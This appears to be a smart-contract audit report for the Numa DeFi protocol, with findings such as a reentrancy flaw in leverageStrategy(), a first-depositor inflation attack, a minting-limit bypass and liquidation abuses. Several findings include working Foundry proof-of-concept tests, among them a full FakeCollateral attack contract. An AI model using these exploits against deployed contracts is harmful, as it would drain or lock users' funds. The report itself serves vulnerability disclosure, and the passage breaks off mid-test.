# Issue H-1: CNumaToken.leverageStrategy() can be re-entered, causing all the vault funds to be moved to a cToken, crashing NUMA price. 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/39 

## Found by 
Vidus, jokr, juaan

### Summary

[`CNumaToken.leverageStrategy()`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/lending/CNumaToken.sol#L141) has a `_collateral` token parameter which allows an attacker to pass in a custom `_collateral` token, which acts as a wrapper around the actual collateral token, while also receiving callbacks to enable reentrancy. 

This allows the flash loan repayment to be avoided, causing a large chunk of the vault's fund to be stuck in the cNuma contract, severely dumping the NUMA price.

### Root Cause

Allowing the user to pass in the `_collateral` token enables reentrancy, allowing them to call `leverageStrategy()` again. Then when `repayLeverage()` is called in the reentrant call, the `leverageDebt` in the vault is set to `0`, even though the first call still has not repaid it's leverageDebt.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

This exact attack is shown in the PoC. It involves a specially crafted `FakeCollateral` contract which is a wrapper around the underlying collateral, which ensures that the attack does not revert.

1. Attacker calls `cNuma.leverageStrategy()`, with `_collateral=FakeCollateral`, and a large `_borrowAmount`
2. The FakeCollateral contract re-enters the `cNuma` contract, calling `leverageStrategy()` again, with a small `_borrowAmount`
3. The reentrant call to `leverageStrategy()` finishes by calling `vault.repayLeverage()` which sets `leverageDebt` to `0`.
4. Since `leverageDebt` is equal to `0`, when it comes time for the initial `leverageStrategy()'s borrow to be repaid, none will be repaid. This causes the entire borrowed funds to be stuck in cNuma.

### Impact

Large amounts of LST can be pulled from the vault into the `CNuma` contract. This dumps the NUMA price since it depends on the ETH balance of the vault. These LSTs will be permanently lost and stuck.

### PoC

The PoC demonstrates moving 10% of the vault's funds into the cNuma contract where it can't be retrieved.

Add the foundry test to `Lending.t.sol`
```solidity
function test_reentrancy_leverageStrategy() public {
        vm.startPrank(userA);
        address[] memory t = new address[](2);
        t[0] = address(cReth);
        t[1] = address(cNuma);
        comptroller.enterMarkets(t);

        // mint cNuma so that we can borrow numa later
        uint depositAmount = 9e24;
        numa.approve(address(cNuma), depositAmount);
        cNuma.mint(depositAmount);

        // To be used as collateral to borrow NUMA
        deal(address(rEth), userA, 1e24 + providedAmount);
        rEth.approve(address(cReth), 1e24);
        cReth.mint(1e24);

        uint256 vaultRethBefore = rEth.balanceOf(address(cNuma.vault()));
        uint reth_in_cNuma = rEth.balanceOf(address(cNuma));

        rEth.approve(address(cNuma), providedAmount);

        // Setting up fake collateral token (which interacts with rETH)
        FakeCollateral fake_cReth = new FakeCollateral(address(cReth), address(rEth), userA, comptroller);

        // Sending it a tiny amount of cReth, so it can re-enter cNuma.leverageStrategy()
        cReth.transfer(address(fake_cReth), 5e10 / 2);

        // call strategy
        uint256 borrowAmount = 1e24;

        uint strategyindex = 0;
        cNuma.leverageStrategy(
            providedAmount,
            borrowAmount,
            CNumaToken(address(fake_cReth)),
            strategyindex
        );

        // check balances
        // cnuma position
        uint256 vaultRethAfter = rEth.balanceOf(address(cNuma.vault()));
        uint reth_in_cNuma_After = rEth.balanceOf(address(cNuma));
        
        // Shows that the rETH balance of the cNuma token contract has gone up by `borrowAmount` (since flash loan was not repaid)
        console.log("cNUMA rETH balance: %e->%e (stuck funds)", reth_in_cNuma, reth_in_cNuma_After);
        assertEq(reth_in_cNuma_After - reth_in_cNuma, borrowAmount);
    }
```

Also add the following attack contract to a new file `FakeCollateral.sol` in the same directory as `Lending.t.sol`
<details><summary>Attack contract</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/console.sol";
import "@openzeppelin/contracts_5.0.2/token/ERC20/ERC20.sol";

import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/FullMath.sol";

import "@uniswap/v3-core/contracts/libraries/FixedPoint96.sol";
import "./uniV3Interfaces/ISwapRouter.sol";

import {NumaComptroller} from "../lending/NumaComptroller.sol";

import {NumaLeverageLPSwap} from "../Test/mocks/NumaLeverageLPSwap.sol";

import "../lending/ExponentialNoError.sol";
import "../lending/INumaLeverageStrategy.sol";
import "../lending/CToken.sol";
import "../lending/CNumaToken.sol";

import {Setup} from "./utils/SetupDeployNuma_Arbitrum.sol";

import {console} from "forge-std/console.sol";
contract FakeCollateral {

    CNumaToken actualCollateral;
    ERC20 actualUnderlying;
    address public user;

    bool entered = false;
    NumaComptroller comptroller;
    constructor(address _actualCollateral, address _underlying, address _user, NumaComptroller _comptroller) {
        actualCollateral = CNumaToken(_actualCollateral);
        actualUnderlying = ERC20(actualCollateral.underlying());
        user = _user;
        comptroller = _comptroller;

        address[] memory t = new address[](1);
        t[0] = address(actualCollateral);
        comptroller.enterMarkets(t);
    }

    function underlying() external view returns(address) {
        return address(actualUnderlying);
    }

    function accrueInterest() public returns (uint) {
        return 0;
    }
    
    function mint(uint256 amt) external returns (uint) {
        actualUnderlying.transferFrom(msg.sender, address(this), amt);
        actualUnderlying.approve(address(actualCollateral), amt);

        uint256 balanceBefore = actualCollateral.balanceOf(address(this));
        actualCollateral.mint(amt);
        uint256 balanceAfter = actualCollateral.balanceOf(address(this));

        if (balanceAfter - balanceBefore > 0) {
             // transfer most of it to the user
             console.log("transferring %e cTokens to user", balanceAfter - balanceBefore - 1 wei);
            actualCollateral.transfer(user, balanceAfter - balanceBefore - 1 wei);
        }
       
        // transfer 1 wei to msg.sender to prevent revert
        actualCollateral.transfer(msg.sender, 1 wei);

    }

    function transfer(address to, uint amt) external returns(bool truth){
        // re-enter for another leverage play

        if (!entered) {
            entered = true;

            CNumaToken(msg.sender).leverageStrategy(0, 1e15, CNumaToken(address(this)), 0);
            return true;
        }
        return true;
    }

    function balanceOf(address addy) public view returns(uint) {
        return actualCollateral.balanceOf(addy);
    }
    

}
```

### Mitigation

_No response_

# Issue H-2: Vault is vulnerable to inflation attack which can cause complete loss of user funds 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/253 

## Found by 
0xlucky, Abhan1041, AestheticBhai, KupiaSec, Oblivionis, ZZhelev, blutorque, jokr, juaan, novaman33, smbv-1923

### Summary

Attacker can attack the first depositors in the vault and can steal all users funds. this attack is also famously known has first deposit bug too. while doing this attack , there is no loss of attacker funds, but there is complete loss of user funds. he can complete this attack by front running and then backrunning , means sandwiching user funds. this problem takes place , due to improper use of exchange rate when total supply is 0. 

### Root Cause

https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CErc20.sol#L60C1-L63C6

https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CToken.sol#L510C1-L515C1

here root cause is total cash in formula is being calculated with balanceOF(address(this)), which can donated direclty too. and price can be inflated

### Internal pre-conditions

_No response_

### External pre-conditions

In this attack , attacker should be the first depositor,  and while deploying on ethereum, he can frontrun and can be the first depositor. 

### Attack Path

while depositing when , total supply of minting token is 0, attacker will deposit , 1 wei of asset and will be minted with 1 wei of share.

so now total supply would be 1 wei. 

now , he will wait for the first depositor , lets say first depsoit is 5e18 , and attacker will directly donates more than that amount , and now user tx would take place, but in result he will be minted with 0 shares , due to inflation in share price.

he can now, redeem his 1 wei of share, and in return he can get all amount of asset( donated+ 1 wei + user deposited)

https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CToken.sol#L374C4-L401C6

in link we can see the formula which is being used for exchangerate.

### Impact

this can lead user loss of funds, and attacker will get benefited from this.

### PoC

_No response_

### Mitigation

1000 wei ( some amount)  shares should be burned while first depositing. this is done by uniswap too

# Issue M-1: Debasing/rebasing periods can be decreased by 50% by a malicious actor 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/18 

## Found by 
000000

### Vulnerability Detail

Upon debasing, we have the following calculation:
```solidity
uint ndebase = ((blockTime - lastBlockTime) * debaseValue) / (deltaDebase);
```
If the time passed is less than 4320, we round down to 0 (`debaseValue is 20` and `deltaDebase` is 24 hours). However, there is the following check to handle such round downs:
```solidity
                if (ndebase <= 0) {
                    // not enough time has passed to get some debase, so we reset our time reference
                    blockTime = lastBlockTime;
                }
```
It resets the time to the last block time before the update. However, this can still be abused by a malicious actor by instead rounding to 1. It can also happen during normal conditions by users simply interacting with the protocol at certain times.
### Attack Path

1. Malicious user calls `VaultManager.getSynthScalingUpdate()` or any other block time state updating function every $4320 * 2 - 1$ seconds
2. The `ndebase` will equal $(4320 * 2 - 1) * 20 / 86400 = 1,9997685185$ which rounds down to 1
3. Instead of 2 debasing periods, there will only be 1 which causes the protocol to debase much slower than supposed to, which would keep the CF low and cause huge issues for the protocol
### Impact

Synthetics will derate slower than intended, which will keep the CF low as users are not incentivized to sell them
### Mitigation

Refactor the formula

# Issue M-2: OracleUtils.ethLeftSide() is not correct for some tokens, leading to incorrect nuAsset pricing 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/38 

## Found by 
juaan

### Summary

[`OracleUtils::ethLeftSide()`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/libraries/OracleUtils.sol#L261-L270) is used to check whether ETH is in the numerator or the denominator of the price feed, in order to correctly price the paired asset.

The check is implemented incorrectly, causing incorrect pricing of assets in some cases.

### Root Cause

The function [`OracleUtils::ethLeftSide()`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/libraries/OracleUtils.sol#L261-L270) checks the first 3 characters of the pricefeed’s description string, and checks if they are “ETH”. If so, it assumes that the numerator is ETH. 

The issue is that there are assets which have “ETH” as the first 3 characters, but are not ETH. An example is the LST, Stader ETHx. 

It has a [price feed on Arbitrum Mainnet](https://data.chain.link/feeds/arbitrum/mainnet/ethx-eth-exchange-rate), denominated in ETH, with the description string “ETHx/ETH”.

Even though ETH is on the right side, the `ethLeftSide()` function will return `true`, which is incorrect.

This causes the asset to be priced incorrectly in the `NumaPrinter`, since it assumes that the asset is ETH.

Note: the protocol team has [stated](https://discord.com/channels/812037309376495636/1315694506754048023/1318110286372409415):
> This **should be able to theoretically mint any asset with a chainlink (18 decimals)**, including RWA assets.

> This could be assets like currencies (nuUSD, nuEUR, etc), commodities (nuGOLD, nuOIL, etc), **other cryptocurrencies** (nuETH, nuBTC), and stocks (nuTSLA, nuNVDA, etc)

### Internal pre-conditions

An asset like ETHx is used as a nuAsset

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

nuAssets can be priced incorrectly in some cases

### PoC

_No response_

### Mitigation

Check the first 4 bytes of the pricefeed's description string, and return true only if the first 4 bytes are the same as “ETH/”
This ensures that the function is always correct

# Issue M-3: CF minimum can be bypassed when minting nuAssets 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/41 

## Found by 
juaan

### Summary

CF is checked before minting nuAssets (instead of after), allowing CF to be massively decreased past the warning. This allows assets to be minted even past the critical CF of 110%, breaking the invariant stated in the README. 

[`NumaPrinter.mintNuAsset()`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/NumaProtocol/NumaPrinter.sol#L179) has the `notInWarningCF` modifier

```solidity
modifier notInWarningCF() {
	  uint currentCF = vaultManager.getGlobalCF();
	  require(currentCF > vaultManager.getWarningCF(), "minting forbidden");
	  _;
}
```

Invariant stated in the README is bypassed:

> New synthetics cannot be minted when CFTHEORETICAL < 110%, where CFTHEORETICAL = rETH_accountingBalance / synthetic_rETHdebt.


### Root Cause

The modifier checks the CF before the minting of the nuAssets.

This means that a user can mint a large number of nuAssets to effectively minting past the warning CF.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

_No response_

### PoC

The PoC shows that the CF goes from `1e5` to  `1.0527e4` during the mint, while the warning CF is `9.9999e4`, so the warning CF has been bypassed, and assets have effectively been minted past the warning CF which should not be allowed. 

Add the test to `Printer.t.sol`
```solidity
function test_mintPastCF() public {
    uint numaAmount = 1000001e18;

    vm.startPrank(deployer);
    numa.transfer(userA, numaAmount);
    vm.stopPrank();
    
    vm.startPrank(userA);

    // compare getNbOfNuAssetFromNuma
    (uint256 nuUSDAmount, uint fee) = moneyPrinter.getNbOfNuAssetFromNuma(
        address(nuUSD),
        numaAmount
    );
    numa.approve(address(moneyPrinter), numaAmount);

    // warning cf test block mint
    uint globalCFBefore = vaultManager.getGlobalCF();


    // put back warning cf
    vm.startPrank(deployer);
    vaultManager.setScalingParameters(
        vaultManager.cf_critical(),
        globalCFBefore - 1,
        vaultManager.cf_severe(),
        vaultManager.debaseValue(),
        vaultManager.rebaseValue(),
        1 hours,
        2 hours,
        vaultManager.minimumScale(),
        vaultManager.criticalDebaseMult()
    );

    console.log("globalCFBefore: %e", globalCFBefore);
    console.log("warningCF: %e", vaultManager.getWarningCF());

    vm.startPrank(userA);

    // slippage ok
    moneyPrinter.mintAssetFromNumaInput(
        address(nuUSD),
        numaAmount,
        nuUSDAmount,
        userA
    );

    uint globalCFAfter = vaultManager.getGlobalCF();
    uint warningCF = vaultManager.getWarningCF();

    console.log("globalCFAfter: %e", globalCFAfter);
    console.log("warningCF: %e", warningCF);

    assertGt(globalCFBefore, warningCF);
    assertLt(globalCFAfter, warningCF);
}
```

### Mitigation

Update the modifier in the following way:

```diff
modifier notInWarningCF() {
+	  _;
	  uint currentCF = vaultManager.getGlobalCF();
	  require(currentCF > vaultManager.getWarningCF(), "minting forbidden");
-	  _;
}
```

This ensures that the CF is checked after minting the nuAssets, so it can't be bypassed.

## Discussion

**tibthecat**

Not sure about that one. Needs to check with team. The goal is to block minting when CF has already reached WarningCF, not to prevent from reaching this warningCF. 
Will check with team, but my current opinion is that it's invalid.



# Issue M-4: No RWAs have a chainlink feed in ETH, so RWAs cannot be minted as nuAssets 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/53 

## Found by 
juaan

### Summary

A key intention of the protocol is to allow RWAs with chainlink feeds to be represented with synthetic nuAssets.

The issue is that the protocol only works with chainlink feeds where the asset is priced with ETH.

All the RWAs like gold, oil, etc on chainlink are only available with USD pairs, not ETH.

### Root Cause

The protocol only works with chainlink feeds where the asset is priced with ETH, but all the RWAs like gold, crude oil, etc on chainlink are only available with USD pairs, not ETH.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Protocol in it's current form cannot work with RWAs. 

### PoC

_No response_

### Mitigation

Have a way to convert the ASSET/USD pairs into ASSET/ETH using the ETH/USD price feed.

# Issue M-5: Deprecated markets allow profitable exploitation of bad debt liquidations 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/67 

## Found by 
t0x1c

## Summary
When markets are deprecated in the protocol, bad debt positions can be liquidated using regular liquidation functions instead of the dedicated bad debt liquidation path. This bypasses important safeguards and allows liquidators to extract a profit, worsening the protocol's position even further.

**_It's important to note_** that in a deprecated market even a healthy borrow position can be liquidated. That situation _could_ be attributed to user error as it may be reasonable to assume that the protocol would give enough prior warnings of the event so that users can close their positions & withdraw their deposits. 
BadDebt borrowers however would've no such incentive to close their position and hence the current vulnerability exists, exacerbating the harm to the protocol health.

## Description
The protocol provides two distinct liquidation paths:

1. Regular liquidation - Used for positions with shortfall but sufficient collateral value. This provides liquidators with a [liquidation incentive multiplier](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/lending/NumaComptroller.sol#L1489) on the collateral they receive:
```js
    function liquidateCalculateSeizeTokens(
        address cTokenBorrowed,
        address cTokenCollateral,
        uint actualRepayAmount
    ) external view returns (uint, uint) {
        ....
        ....

        /*
         * Get the exchange rate and calculate the number of collateral tokens to seize:
@--->    *  seizeAmount = actualRepayAmount * liquidationIncentive * priceBorrowed / priceCollateral
         *  seizeTokens = seizeAmount / exchangeRate
         *   = actualRepayAmount * (liquidationIncentive * priceBorrowed) / (priceCollateral * exchangeRate)
         */

        ....
        ....
    }
```

2. Bad debt liquidation - Used when collateral value is less than the borrowed amount. This uses a simpler [percentage-based calculation](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/lending/NumaComptroller.sol#L1458) with **no additional** `liquidationIncentive`:
```js
    function liquidateBadDebtCalculateSeizeTokensAfterRepay(
        address cTokenCollateral,
        address borrower,
        uint percentageToTake
    ) external view override returns (uint, uint) {
        /*
         * Get the exchange rate and calculate the number of collateral tokens to seize:
         * for bad debt liquidation, we take % of amount repaid as % of collateral seized
         *  seizeAmount = (repayAmount / borrowBalance) * collateralAmount
         *  seizeTokens = seizeAmount / exchangeRate
         *
         */

        (, uint tokensHeld, , ) = CToken(cTokenCollateral).getAccountSnapshot(
            borrower
        );
@--->   uint seizeTokens = (percentageToTake * tokensHeld) / (1000);
        return (uint(Error.NO_ERROR), seizeTokens);
    }
```


However, when a market is deprecated (collateralFactor = 0, borrowing paused, reserveFactor = 100%), the code only checks this inside [liquidateBorrowAllowed()](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/lending/NumaComptroller.sol#L579-L583):
```js
        if (isDeprecated(CToken(cTokenBorrowed))) {
            require(
@--->           borrowBalance >= repayAmount,
                "Can not repay more than the total borrow"
            );
        }
```

The liquidator has no need to go through a path which internally calls [liquidateBadDebtAllowed()](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/lending/NumaComptroller.sol#L620).
This allows bad debt positions to be liquidated using the regular liquidation path (via `liquidateNumaBorrower()` or `liquidateLstBorrower()`) that includes the liquidation incentive multiplier. Thus liquidator can provide a lower `repayAmount` than the collateral is worth and end up receiving a profit, worsening the protocol's health even further.

## Proof of Concept
Run the following test with `FOUNDRY_PROFILE=lite forge test --mt test_deprecatedMarketLiquidation -vv` to see the following output:
<details>
<summary>
Click to view
</summary>

1. First, add a console statement inside `liquidateLstBorrower()` for easier monitoring:
```diff
    function liquidateLstBorrower(
        address _borrower,
        uint _lstAmount,
        bool _swapToInput,
        bool _flashloan
    ) external whenNotPaused notBorrower(_borrower) {
        // < existing code... >
        ...
        ...

        if (_swapToInput) {
            // sell numa to lst
            uint lstReceived = NumaVault(address(this)).sell(
                receivedNuma,
                lstAmount,
                address(this)
            );

            uint lstLiquidatorProfit = lstReceived - lstAmount;

            // cap profit
            if (lstLiquidatorProfit > maxLstProfitForLiquidations)
                lstLiquidatorProfit = maxLstProfitForLiquidations;

            uint lstToSend = lstLiquidatorProfit;
            if (!_flashloan) {
                // send profit + input amount
                lstToSend += lstAmount;
            }
            // send profit
            SafeERC20.safeTransfer(IERC20(lstToken), msg.sender, lstToSend);
        } else {
            uint numaProvidedEstimate = vaultManager.tokenToNuma(
                lstAmount,
                last_lsttokenvalueWei,
                decimals,
                criticalScaleForNumaPriceAndSellFee
            );
            uint maxNumaProfitForLiquidations = vaultManager.tokenToNuma(
                maxLstProfitForLiquidations,
                last_lsttokenvalueWei,
                decimals,
                criticalScaleForNumaPriceAndSellFee
            );

            uint numaLiquidatorProfit;
            // we don't revert if liquidation is not profitable because it might be profitable
            // by selling lst to numa using uniswap pool
            if (receivedNuma > numaProvidedEstimate) {
                numaLiquidatorProfit = receivedNuma - numaProvidedEstimate;
            }

            uint vaultProfit;
            if (numaLiquidatorProfit > maxNumaProfitForLiquidations) {
                vaultProfit =
                    numaLiquidatorProfit -
                    maxNumaProfitForLiquidations;
            }
+           console2.log("\n Liquidator's NUMA Profit =", (numaLiquidatorProfit - vaultProfit) / 1e18, "ether");
            uint numaToSend = receivedNuma - vaultProfit;
            // send to liquidator
            SafeERC20.safeTransfer(
                IERC20(address(numa)),
                msg.sender,
                numaToSend
            );

            // AUDITV2FIX: excess vault profit numa is burnt
            if (vaultProfit > 0) numa.burn(vaultProfit);
        }
        endLiquidation();
    }
```

2. Now add this test inside `Vault.t.sol`:
```js
    function test_deprecatedMarketLiquidation() public {
        uint funds = 100 ether;
        uint borrowAmount = 80 ether; 

        deal({token: address(rEth), to: userA, give: funds * 2});
        
        // First approve and enter the NUMA market
        vm.startPrank(userA);
        address[] memory t = new address[](1);
        t[0] = address(cNuma);
        comptroller.enterMarkets(t);

        // Buy some NUMA
        rEth.approve(address(vault), funds);
        uint numas = vault.buy(funds, 0, userA);

        // Deposit enough NUMA as collateral
        uint cNumaBefore = cNuma.balanceOf(userA);
        numa.approve(address(cNuma), numas);
        cNuma.mint(numas);
        uint cNumas = cNuma.balanceOf(userA) - cNumaBefore;
        emit log_named_decimal_uint("Numas deposited =", numas, 18);
        emit log_named_decimal_uint("cNumas minted   =", cNumas, 18);

        // Borrow rEth
        uint balanceBefore = rEth.balanceOf(userA);
        cReth.borrow(borrowAmount);

        // Get current borrow balance 
        uint borrowBalance = cReth.borrowBalanceCurrent(userA);

        emit log_named_decimal_uint("borrowBalance befor =", borrowBalance, 18); 
        vm.stopPrank();

        vm.startPrank(deployer);
        // make the borrow a bad-debt
        vaultManager.setSellFee(0.5 ether); // 50%
        (, , , uint badDebt) = comptroller.getAccountLiquidityIsolate(userA, cNuma, cReth);
        assertGt(badDebt, 0, "no bad-debt");
        emit log_named_decimal_uint("badDebt   =", badDebt, 18); 

        // deprecate the market
        assertFalse(comptroller.isDeprecated(cReth));
        comptroller._setCollateralFactor(cReth, 0);
        comptroller._setBorrowPaused(cReth, true);
        cReth._setReserveFactor(1e18);
        assertTrue(comptroller.isDeprecated(cReth));
        console2.log("market successfully deprecated");
        vm.stopPrank();

        // liquidate via "shortfall" route instead of "badDebt" route
        vm.startPrank(userB); // liquidator
        uint repay = borrowBalance / 2;
        deal({token: address(rEth), to: userB, give: repay});
        rEth.approve(address(vault), repay);
        vault.liquidateLstBorrower(userA, repay, false, false); // @audit-info : smaller `repay` avoids `LIQUIDATE_SEIZE_TOO_MUCH` by ensuring `seizeTokens < cTokenCollateral`
        console2.log("liquidated successfully");
    }
```

</details>
<br>

Output:
```text
[PASS] test_deprecatedMarketLiquidation() (gas: 1630968)
Logs:
  VAULT TEST
  Numas deposited =: 749432.837569203755749171
  cNumas minted   =: 0.003747164187846018
  borrowBalance befor =: 80.000000000000000000
  badDebt   =: 32.360563278288316029
  market successfully deprecated
  redeem? 0

 Liquidator's NUMA Profit = 78656 ether    <------------- liquidator received profit on a badDebt by calling `liquidateLstBorrower()`
  liquidated successfully
```

## Severity
Impact: High. Worsens the protocol's health even further.

Likelihood: Low/Medium. Requires an event where a market has been deprecated. 

Overall Severity: Medium

## Mitigation
Add a check that even for deprecated markets, regular (shortfall) liquidation path is not allowed for badDebt positions.

## Discussion

**tibthecat**

As discussed in the dashboard, I think it's LOW because protocol could liquidate any bad debt position before deprecating.
But still, it's better for us to fix that and use the liquidatebaddebt path even when market is deprecated.



# Issue M-6: Incorrect liquidation mechanics either causes revert on liquidation due to insufficient seizeTokens or causes transition into bad debt 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/101 

## Found by 
t0x1c

## Summary
The protocol's liquidation mechanics are fundamentally flawed in two distinct ways that emerge when performing liquidations on positions. Either:

1. The protocol reverts on liquidation of remaining debt due to insufficient collateral to seize, **OR**

2. The position transitions into bad debt status after a partial liquidation, making the remaining debt unprofitable for liquidators and worsening protocol's health.

## Description
The protocol has two distinct broken liquidation paths that emerge when liquidating positions:

### Prerequisite
The borrower's LTV should have worsened enough such that if the entire debt were to be liquidated, there wouldn't be enough collateral cTokens to seize after adding the liquidation incentive on top. Or in other words the liquidator would encounter a revert with error `LIQUIDATE_SEIZE_TOO_MUCH` if he tried to liquidate the entire debt.

### Path 1: Insufficient `seizeTokens`--> ( _coded as `test_liquidationMechanics_path01`_ )
In this scenario:

1. Imagine that a position becomes liquidatable (has shortfall but not in badDebt). And the `borrowBalance` is above `minBorrowAmountAllowPartialLiquidation`.

2. A liquidator attempts a liquidation. This _will always be a partial liquidation_ due to one of these 3 reasons:
    a. The [closeFactorMantissa](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/lending/NumaComptroller.sol#L104-L108) setting constraints that `repayAmount` is no more than 90% of the `borrowBalance`, even in the best of scenarios.
    b. Liquidator could choose a partial repayment based on their financial capacity.
    c. Liquidator could maliciously choose a partial repayment in order to carry out this attack.

3. The liquidator is awarded a [liquidationIncentive](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/lending/NumaComptroller.sol#L1487-L1511) (for e.g., 12%) and is able to seize those collateral cTokens from the borrower. 

4. Due to the above, every iteration of partial liquidation worsens the ratio of collateral cTokens to the remaining `borrowBalance` ( LTV increases with each iteration ).

5. Eventually a state is arrived where `borrowBalance` is below `minBorrowAmountAllowPartialLiquidation`. Now [only full liquidations are allowed](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/NumaProtocol/NumaVault.sol#L1135-L1138) and hence every liquidation attempt [will revert with error](https://github.com/NumaMoney/Numa/blob/c6476d828f556967e64410b5c11c1f2cd77220c7/contracts/lending/CToken.sol#L1020-L1024) `LIQUIDATE_SEIZE_TOO_MUCH`. Note that the debt is still not in the badDebt territory and hence `liquidateBadDebt()` can't be called yet which wouldn't have cared about awarding any `liquidationIncentive`.

### Path 2: Transition to Bad Debt--> ( _coded as `test_liquidationMechanics_path02`_ )
In the second scenario:

- Steps 1-4 same as above.

- Step 5: The worsening ratio with each partial liquidation iteration eventually pushes the debt into the badDebt territory where `borrowBalance` is greater than the remaining collateral. Although someone can call `liquidateBadDebt()`, it doesn't really offer any incentive to the liquidator. The protocol is already losing money at this point, even if someone cleans up the remaining borrowed balance.

## Impact
The impact is severe:
1. In Path 1, positions are left with debt that cannot be liquidated due to reverting transactions, leaving the protocol with unclearable bad positions
2. In Path 2, positions transition into bad debt and will now be closed at a loss. The protocol's health is worse than before.

## Proof of Concept
Add the 2 tests inside `Vault.t.sol` and run with `FOUNDRY_PROFILE=lite forge test --mt test_liquidationMechanics -vv` to see them pass:
<details>

<summary>
Click to View
</summary>


```js
    function test_liquidationMechanics_path01() public {
        // Initial setup
        vm.startPrank(deployer);
        vaultManager.setSellFee(1 ether); // no sell fee
        comptroller._setCollateralFactor(cNuma, 0.85 ether); // 85% LTV allowed
        vm.stopPrank();

        uint collateralAmount = 25 ether;
        uint borrowAmount = 20 ether;  // 80% LTV to start

        deal({token: address(rEth), to: userA, give: collateralAmount});
        
        // First approve and enter the NUMA market
        vm.startPrank(userA);
        address[] memory t = new address[](1);
        t[0] = address(cNuma);
        comptroller.enterMarkets(t);

        // Buy NUMA with rETH to use as collateral
        rEth.approve(address(vault), collateralAmount);
        uint numas = vault.buy(collateralAmount, 0, userA);

        // Deposit NUMA as collateral
        uint cNumaBefore = cNuma.balanceOf(userA);
        numa.approve(address(cNuma), numas);
        cNuma.mint(numas);
        uint cNumas = cNuma.balanceOf(userA) - cNumaBefore;
        
        emit log_named_decimal_uint("Numas deposited =", numas, 18);
        emit log_named_decimal_uint("cNumas received =", cNumas, 18);

        // Borrow rETH
        cReth.borrow(borrowAmount);
        uint initialBorrowBalance = cReth.borrowBalanceCurrent(userA);
        emit log_named_decimal_uint("Initial borrow =", initialBorrowBalance, 18);
        (, , uint shortfall, uint badDebt) = comptroller.getAccountLiquidityIsolate(userA, cNuma, cReth);
        assertEq(shortfall, 0, "Unhealthy borrow");
        vm.stopPrank();

        // Make position liquidatable
        vm.startPrank(deployer);
        vaultManager.setSellFee(0.90 ether); 
        
        // Verify position is liquidatable
        (, , shortfall, badDebt) = comptroller.getAccountLiquidityIsolate(userA, cNuma, cReth);
        assertGt(shortfall, 0, "Position should be liquidatable");
        assertEq(badDebt, 0, "Position shouldn't be in badDebt region");
        emit log_named_decimal_uint("Shortfall =", shortfall, 18);

        // Set liquidation incentive
        comptroller._setLiquidationIncentive(1.12e18); // 12% premium
        // Set close factor
        comptroller._setCloseFactor(0.9e18); // 90%
        vm.stopPrank();

        // First liquidation attempt
        vm.startPrank(userC); // liquidator
        uint borrowBalance = cReth.borrowBalanceCurrent(userA);
        uint repayAmount = (borrowBalance * 55) / 100; // repaying 55% of the debt
        
        deal({token: address(rEth), to: userC, give: repayAmount});
        rEth.approve(address(vault), repayAmount);
        
        // This should succeed since there's enough collateral for the first liquidation
        vault.liquidateLstBorrower(userA, repayAmount, false, false);
        emit log_named_decimal_uint("First liquidation repaid =", repayAmount, 18);

        uint remainingBorrow = cReth.borrowBalanceCurrent(userA);
        emit log_named_decimal_uint("Remaining borrow =", remainingBorrow, 18);
        // Only full liquidation allowed now
        assertLt(remainingBorrow, vault.minBorrowAmountAllowPartialLiquidation(), "below minBorrowAmountAllowPartialLiquidation");
        // Verify again the position is liquidatable but is not in the badDebt region
        (, , shortfall, badDebt) = comptroller.getAccountLiquidityIsolate(userA, cNuma, cReth);
        emit log_named_decimal_uint("Shortfall2 =", shortfall, 18);
        emit log_named_decimal_uint("BadDebt2   =", badDebt, 18);
        assertGt(shortfall, 0, "Position2 should be liquidatable");
        assertEq(badDebt, 0, "Position2 shouldn't be in badDebt region");
        vm.stopPrank();

        // temporary hack required to allow full liquidation now since 
        // `borrowBalance < minBorrowAmountAllowPartialLiquidation`. Needs to be done due 
        // to existence of a different bug
        vm.prank(deployer);
        comptroller._setCloseFactor(1e18); 

        // Second liquidation attempt for remaining debt
        vm.startPrank(userC); // liquidator
        deal({token: address(rEth), to: userC, give: remainingBorrow});
        rEth.approve(address(vault), remainingBorrow);
        vm.expectRevert("LIQUIDATE_SEIZE_TOO_MUCH");
